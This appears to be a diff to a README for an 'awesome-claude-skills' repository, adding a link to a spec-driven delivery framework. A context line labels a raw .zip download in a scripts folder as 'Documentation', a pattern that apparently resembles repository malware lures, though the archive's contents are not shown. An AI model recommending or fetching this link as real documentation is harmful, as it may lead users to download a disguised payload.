@@ -83,3 +83,4 @@ You can open an issue on the GitHub page or contact us through the links provide
 - [Documentation](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
 
 Thank you for using awesome-claude-skills! We appreciate your interest in enhancing Claude’s skills. Enjoy your experience!
+- [ai-delivery-spec](https://github.com/franklinxkk/ai-delivery-spec) — Spec-driven delivery framework for product managers — 4 delivery tiers, 0D triage, prototype testability, AI runtime governance, 5 domain modules
